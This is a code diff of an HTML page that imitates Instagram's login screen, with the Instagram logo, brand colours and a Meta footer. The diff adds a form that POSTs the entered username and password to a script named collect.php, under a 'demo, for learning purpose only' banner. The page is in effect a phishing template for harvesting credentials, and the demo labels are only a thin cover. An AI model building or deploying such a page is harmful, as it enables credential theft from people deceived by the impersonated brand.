@@ -3,100 +3,105 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Login UI</title>
+<title>Demo Login UI</title>
 
 <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    *{
+        margin:0;
+        padding:0;
+        box-sizing:border-box;
+        font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     }
 
-    body {
-        background: #ffffff;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
+    body{
+        background:#ffffff;
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        height:100vh;
     }
 
-    .container {
-        width: 100%;
-        max-width: 360px;
-        text-align: center;
-        padding: 20px;
+    .container{
+        width:100%;
+        max-width:360px;
+        text-align:center;
+        padding:20px;
     }
 
-    .lang {
-        font-size: 14px;
-        color: #8e8e8e;
-        margin-bottom: 30px;
+    .lang{
+        font-size:14px;
+        color:#8e8e8e;
+        margin-bottom:20px;
     }
 
-    .logo {
-        width: 70px;
-        margin: 0 auto 30px;
+    .logo{
+        width:70px;
+        margin-bottom:15px;
     }
 
-    .input-box {
-        width: 100%;
-        padding: 14px;
-        margin-bottom: 12px;
-        border-radius: 10px;
-        border: 1px solid #dbdbdb;
-        background: #fafafa;
-        font-size: 14px;
+    .demo-tag{
+        font-size:13px;
+        color:#ff0000;
+        margin-bottom:25px;
+        font-weight:600;
     }
 
-    .input-box:focus {
-        outline: none;
-        border-color: #a8a8a8;
-        background: #fff;
+    .input-box{
+        width:100%;
+        padding:14px;
+        margin-bottom:12px;
+        border-radius:10px;
+        border:1px solid #dbdbdb;
+        background:#fafafa;
+        font-size:14px;
     }
 
-    .login-btn {
-        width: 100%;
-        padding: 14px;
-        border: none;
-        border-radius: 30px;
-        background: #0095f6;
-        color: #fff;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        margin-top: 10px;
+    .input-box:focus{
+        outline:none;
+        border-color:#a8a8a8;
+        background:#fff;
     }
 
-    .login-btn:hover {
-        background: #007cd6;
+    .login-btn{
+        width:100%;
+        padding:14px;
+        border:none;
+        border-radius:30px;
+        background:#0095f6;
+        color:#fff;
+        font-size:16px;
+        font-weight:600;
+        cursor:pointer;
+        margin-top:10px;
     }
 
-    .forgot {
-        margin-top: 18px;
-        font-size: 14px;
-        color: #00376b;
-        text-decoration: none;
-        display: inline-block;
+    .login-btn:hover{
+        background:#007cd6;
     }
 
-    .create-btn {
-        margin-top: 80px;
-        padding: 12px;
-        width: 100%;
-        border-radius: 30px;
-        border: 1px solid #0095f6;
-        background: transparent;
-        color: #0095f6;
-        font-size: 15px;
-        font-weight: 600;
-        cursor: pointer;
+    .note{
+        font-size:12px;
+        color:#8e8e8e;
+        margin-top:15px;
     }
 
-    .meta {
-        margin-top: 20px;
-        font-size: 13px;
-        color: #8e8e8e;
+    .create-btn{
+        margin-top:70px;
+        padding:12px;
+        width:100%;
+        border-radius:30px;
+        border:1px solid #0095f6;
+        background:transparent;
+        color:#0095f6;
+        font-size:15px;
+        font-weight:600;
+        cursor:pointer;
+    }
+
+    .meta{
+        margin-top:20px;
+        font-size:13px;
+        color:#8e8e8e;
     }
 </style>
 </head>
@@ -109,15 +114,35 @@
 
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo">
 
-    <input type="text" class="input-box" placeholder="Username, email address or mobile number">
+    <div class="demo-tag">⚠ DEMO LOGIN – FOR LEARNING PURPOSE ONLY</div>
 
-    <input type="password" class="input-box" placeholder="Password">
+    <form action="collect.php" method="POST">
 
-    <button class="login-btn">Log in</button>
+        <input type="text"
+               name="demo_username"
+               class="input-box"
+               placeholder="Demo Username"
+               required>
 
-    <a href="#" class="forgot">Forgotten password?</a>
+        <input type="password"
+               name="demo_password"
+               class="input-box"
+               placeholder="Demo Password"
+               required>
 
-    <button class="create-btn">Create new account</button>
+        <button type="submit" class="login-btn">
+            Log in (Demo)
+        </button>
+
+    </form>
+
+    <div class="note">
+        This page is for educational & testing purposes only.
+    </div>
+
+    <button class="create-btn" disabled>
+        Create new account
+    </button>
 
     <div class="meta">∞ Meta</div>
 
